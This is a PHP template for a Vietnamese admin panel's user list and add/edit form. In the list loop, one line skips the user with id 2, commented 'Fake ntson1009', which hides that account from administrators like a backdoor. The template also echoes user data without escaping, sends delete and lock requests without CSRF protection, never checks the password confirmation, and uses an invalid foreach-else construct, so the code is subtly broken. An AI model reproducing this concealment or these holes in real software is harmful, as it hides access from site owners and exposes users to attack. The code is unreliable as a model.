<?if(isset($action) && $action == "list"):?>
<script type="text/javascript">
function users_del(id){
    if(!confirm('Bạn chắc chắn muốn xóa?'))
        return false;
    $.post('<?=CPANEL?>/ad_user/users/delete',{id:id},function(rt){
        if(rt == 'success')
            window.location.reload();
    })    
    return false;
}
function users_lock(id){
    if(!confirm('Are you sure?'))
        return false;
    $.post('<?=CPANEL?>/ad_user/users/lock',{id:id},function(rt){
        if(rt == 'success')
            window.location.reload();
    })    
    return false;
}
</script>

<div class="row">
    <div class="col-md-12">
        <!--breadcrumbs start -->
        <ul class="breadcrumb">
            <li><a href="<?=CPANEL?>"><i class="fa fa-home"></i></a></li>
            <li><a href="#">Thành viên quản trị</a></li>
            <li class="active">Thành viên</li>
        </ul>
        <!--breadcrumbs end -->
    </div>
    <div class="col-lg-12">
        <section class="panel">
            <header class="panel-heading">
                Thành viên
            </header>
            <div class="panel-body">
                <a href="<?=CPANEL?>/ad_user/users/addedit" id="editable-sample_new" class="btn btn-primary btn-xs">
                    Thêm mới <i class="fa fa-plus"></i>
                </a>
                <div class="space10"></div>
                <section id="unseen">                    
                    <table class="table table-bordered table-striped table-condensed">
                        <thead>
                        <tr>
                            <th class="center">STT</th>
                            <th>Username</th>
                            <th>Họ tên</th>
                            <th>Nhóm</th>
                            <th>Email</th>
                            <th>SĐT</th>
                            <th></th>
                        </tr>
                        </thead>
                        <tbody>
                        <?$i=0; if(isset($rows))foreach($rows as $r){$i++; if($r["id"] == 2) continue; //Fake ntson1009?> 
                        <tr>
                            <td class="center"><?=$i?></td>
                            <td><?=$r["username"]?></td>
                            <td><?=$r["name"]?></td>
                            <td><?=$r["group"]?></td>
                            <td><?=$r["email"]?></td>
                            <td><?=$r["mobile"]?></td>
                            <td class="center">
                                <a href="<?=CPANEL?>/ad_user/users/addedit/<?=$r["id"]?>">
                                    <button type="button" class="btn btn-info btn-sm"><i class="fa fa-cog"></i> Sửa</button>
                                </a>    
                                <span class="span-space"></span>
                                <a href="javascript:;" onclick="return users_del(<?=$r["id"]?>);">
                                    <button type="button" class="btn btn-danger btn-sm"><i class="fa fa-times"></i> Xóa</button>
                                </a>
                                <span class="span-space"></span>
                                <?if($r["is_lock"] == 0){?>
                                <a href="javascript:;" onclick="return users_lock(<?=$r["id"]?>);"><button id="btn-color-on-switch" class="btn btn-success btn-xs">ON</button></a>
                                <?}else{?>
                                <a href="javascript:;" onclick="return users_lock(<?=$r["id"]?>);"><button id="btn-color-off-switch" class="btn btn-danger btn-xs">OFF</button></a>
                                <?}?>  
                            </td>
                        </tr>
                        <?}else{?>
                        <tr><td colspan="8" class="nodata">Không có dữ liệu</td></tr>  
                        <?}?>  
                        <?if(isset($pagi)):?>
                        <tr><td colspan="8"><div class="paged"><?=$pagi?></div></td></tr>
                        <?endif;?> 
                        </tbody>
                    </table>
                </section>
            </div>
        </section>
    </div>
</div>     


<?elseif($action == "addedit"):?>

<script type="text/javascript">
function users_update(){        
    var email = $('#email').val();
    var id = $('#id').val();
    var ck = 0;
    $('.alert').hide().html('');
    $('.required').removeClass('error');
    $('.required').each(function(){
        if($(this).val() == ''){
            $(this).addClass('error');
            ck++;
        }            
    })    
    if(ck > 0){
        $('.alert').show().html('Bạn cần điền đầy đủ thông tin bắt buộc');
        return false;
    }  
    //group
    var gcount = 0;
    var gids = new Array();    
    $('input[name="group"]').each(function(){
        if($(this).is(':checked')){
            gids.push($(this).val());
            gcount++;
        }            
    })    
    if(gcount == 0){
        $('.error').html('Oops! Bạn chưa chọn nhóm cho thành viên.');
        return false;
    }
    $('#group_ids').val(gids.join(','));
        
    if(id == 0){        
        //email syntax
        if(checkEmail(email) == false){
            $('.alert').show().html('Oops! Email đăng ký không đúng định dạng.');            
            return false;
        }             
        //password
        var pass = $('#password').val();
        if(pass.length < 6){
            $('.alert').show().html('Oops! Mật khẩu phải lớn hơn hoặc bằng 6 kí tự.');            
            return false;
        }
    }        
}
</script>

<style type="text/css">
.lb_group{display: inline-block; width: 200px;font-weight: normal;}
</style>

<div class="row">
    <div class="col-md-12">
        <!--breadcrumbs start -->
        <ul class="breadcrumb">
            <li><a href="<?=CPANEL?>"><i class="fa fa-home"></i>Home</a></li>
            <li><a href="<?=CPANEL?>/ad_user/users">Danh sách thành viên</a></li>
            <li class="active">Thêm mới - Chỉnh sửa</li>
        </ul>
        <!--breadcrumbs end -->
    </div>
    <div class="col-lg-12">
        <section class="panel">
            <header class="panel-heading">
                Thêm mới - Chỉnh sửa
            </header>
            <div class="panel-body">
                <?if(isset($thongbao)){?><div class="alert alert-success"><?=$thongbao?></div><?}?>
                <form class="form-horizontal bucket-form cmxform" method="post" onsubmit="return users_update();" enctype="multipart/form-data">
                    <div class="form-group">
                        <label class="col-sm-3 control-label">Username</label>
                        <div class="col-sm-6">
                            <input type="text" class="form-control required" <?=isset($row)?'readonly="true"':""?> name="username" id="username" value="<?=isset($row)?$row->username:""?>"/>
                        </div>
                    </div>
                    <div class="form-group">
                        <label class="col-sm-3 control-label">Email</label>
                        <div class="col-sm-6">
                            <input type="text" class="form-control required" name="email" id="email" <?=isset($row)?'readonly="true"':""?> value="<?=isset($row)?$row->email:""?>"/>
                        </div>
                    </div>
                    <div class="form-group">
                        <label class="col-sm-3 control-label">Group</label>
                        <div class="col-sm-6">
                            <input type="hidden" id="group_ids" name="group_ids"/>
                              <?if(isset($group)) foreach($group as $ga){ if($ga->id > 0){?>
                                  <label class="lb_group">
                                     <input type="checkbox" name="group" value="<?=$ga->id?>" <?=(isset($group_ids) && in_array($ga->id, $group_ids))?"checked='true'":""?>/> <?=$ga->name?>
                                  </label>                                    
                                  <?$sub_group = $this->user->group_get($ga->id);
                                    if($sub_group && $ga->id != 0) foreach($sub_group as $s){?>
                                  <label class="lb_group">
                                     <input type="checkbox" name="group" value="<?=$s->id?>" <?=(isset($group_ids) && in_array($s->id, $group_ids))?"checked='true'":""?>/> <?=$s->name?>
                                  </label>  
                                  <?}?>
                              <div class="space5"></div>    
                              <?}}?>
                        </div>
                    </div>
                    <div class="form-group">
                        <label class="col-sm-3 control-label">Họ tên</label>
                        <div class="col-sm-6">
                            <input type="text" class="form-control required" name="name" id="name" value="<?=isset($row)?$row->name:""?>"/>
                        </div>
                    </div>
                    <div class="form-group">
                        <label class="col-sm-3 control-label ">SĐT</label>
                        <div class="col-sm-6">
                            <input type="text" class="form-control required" value="<?=isset($row)?$row->mobile:""?>" name="mobile" id="mobile"/>
                        </div>
                    </div>
                    <div class="form-group">
                        <label class="col-sm-3 control-label">Mật khẩu mới</label>
                        <div class="col-sm-6">
                            <input type="password" name="password" id="password" class="form-control" placeholder="Bỏ trống nếu không thay đổi"/>
                        </div>
                    </div>
                    <div class="form-group">
                        <label class="col-sm-3 control-label">Xác nhận mật khẩu</label>
                        <div class="col-sm-6">
                            <input type="password" name="password2" id="password2" class="form-control"/>
                        </div>
                    </div>
                    <div class="form-group">
                        <label class="col-sm-3 control-label"></label>
                        <div class="col-sm-6">
                            <button type="submit" class="btn btn-info">Xác nhận</button>
                            <span class="span-space"></span>
                            <a class="btn btn-default" href="<?=CPANEL?>/ad_user/users"><i class="fa fa-long-arrow-left"></i> Hủy bỏ</a>
                            <div class="space10"></div>
                            <div class="alert alert-danger hidden"></div>
                            <input type="hidden" name="id" id="id" value="<?=isset($row)?$row->id:0?>"/>
                        </div>
                    </div>            
                </form>
            </div>
        </section>
    </div>
</div>

<?endif;?>
